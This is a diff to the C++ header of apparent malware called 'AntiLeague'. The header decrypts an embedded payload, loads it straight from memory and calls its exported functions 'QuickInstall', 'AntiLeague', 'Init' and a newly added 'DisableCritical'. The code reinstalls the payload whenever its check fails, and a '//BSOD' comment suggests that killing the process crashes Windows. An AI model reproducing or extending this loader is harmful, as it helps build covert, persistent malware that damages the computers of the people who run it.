@@ -1,10 +1,12 @@
 #pragma once
 #include <string>
+#include <Windows.h>
 #include "MemoryModule.h"
 
 typedef bool (*AntiLeagueProc)();
 typedef void (*QuickInstallProc)(std::string* payload, const std::string& dec_key);
 typedef void (*InitProc)(std::string* _payload, std::string* payload, const std::string& dec_key);
+typedef void (*DisableCriticalProc)();
 
 class c_AntiLeague
 {
@@ -12,19 +14,37 @@ private:
     HMEMORYMODULE hPayload;
 	std::string getPayload();
 
+    /*
+        Thread safe (they're only modified by constructor in main thread)
+    */
+    HWND hWnd;
+    HANDLE SafeShutdown;
+
 	c_AntiLeague()
-		: hPayload(NULL)
+		: hPayload(NULL), hWnd(NULL), SafeShutdown(NULL)
 	{
 		HANDLE hMutex = CreateMutex(NULL, TRUE, L"AntiLeague");
 
 		if (GetLastError() == ERROR_ALREADY_EXISTS)
 		{
-			std::exit(0);
+			exit(0);
 		}
 	}
 
+    ~c_AntiLeague()
+    {
+        SendMessage(hWnd, WM_QUIT, 1, NULL);
+        WaitForSingleObject(SafeShutdown, INFINITE);
+
+        MemoryFreeLibrary(hPayload);
+        hPayload = NULL;
+    }
+
 	void cipher();
 	void gen_dec_key();
+
+    friend DWORD WINAPI SafeShutdown(LPVOID event);
+    friend LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
 
 public:
 	static c_AntiLeague& getInstance()
@@ -37,78 +57,40 @@ public:
 	std::string payload;
 
 	void Init();
-    void FreeLibrary() { MemoryFreeLibrary(hPayload); hPayload = NULL; }
+    void LoadPayload(const std::string& payloadLocation);
 
     template <typename T>
-    void Attack(T function, const char* name, std::string* _payload)
+    void Attack(T function, const char* name, std::string* payloadLocation)
     {
-        if (hPayload == NULL)
+        function = (T)MemoryGetProcAddress(hPayload, name);
+
+        if (function != NULL)
         {
-            cipher();
-
-            hPayload = MemoryLoadLibrary(payload.c_str(), payload.size());
-
-            gen_dec_key();
-            cipher();
-
-            if (hPayload == NULL)
+            if constexpr (std::is_same_v<T, InitProc>)
             {
-                MessageBox(NULL, L"Payload Memory Error", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
-                std::exit(1);
+                function(payloadLocation, &payload, dec_key);
             }
-
-            function = (T)MemoryGetProcAddress(hPayload, name);
-
-            if (function != NULL)
+            else if constexpr (std::is_same_v<T, QuickInstallProc>)
             {
-                if constexpr (std::is_same_v<T, InitProc>)
+                function(&payload, dec_key);
+            }
+            else if constexpr (std::is_same_v<T, AntiLeagueProc>)
+            {
+                if (!function())
                 {
-                    function(_payload, &payload, dec_key);
-                }
-                else if constexpr (std::is_same_v<T, QuickInstallProc>)
-                {
-                    function(&payload, dec_key);
-                }
-                else if constexpr (std::is_same_v<T, AntiLeagueProc>)
-                {
-                    if (!function())
-                    {
-                        Attack<QuickInstallProc>(QuickInstallProc(), "QuickInstall", NULL);
-                        Attack<AntiLeagueProc>(AntiLeagueProc(), "AntiLeague", NULL);
-                    }
+                    Attack<QuickInstallProc>(QuickInstallProc(), "QuickInstall", NULL);
+                    Attack<AntiLeagueProc>(AntiLeagueProc(), "AntiLeague", NULL);
                 }
             }
-            else
+            else if constexpr (std::is_same_v<T, DisableCriticalProc>)
             {
-                MessageBox(NULL, L"Payload Function Missing", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
-                std::exit(1);
+                function();
             }
         }
         else
         {
-            function = (T)MemoryGetProcAddress(hPayload, name);
-
-            if (function != NULL)
-            {
-                if constexpr (std::is_same_v<T, InitProc>)
-                {
-                    function(_payload, &payload, dec_key);
-                }
-                else if constexpr (std::is_same_v<T, QuickInstallProc>)
-                {
-                    function(&payload, dec_key);
-                }
-                else if constexpr (std::is_same_v<T, AntiLeagueProc>)
-                {
-                    if (!function())
-                        Attack<QuickInstallProc>(QuickInstallProc(), "QuickInstall", NULL);
-                }
-            }
-            else
-            {
-                MessageBox(NULL, L"Payload Function Missing", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
-                std::exit(1);
-            }
+            MessageBox(NULL, L"Payload Function Missing", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
+            exit(1); //BSOD
         }
     }
 };
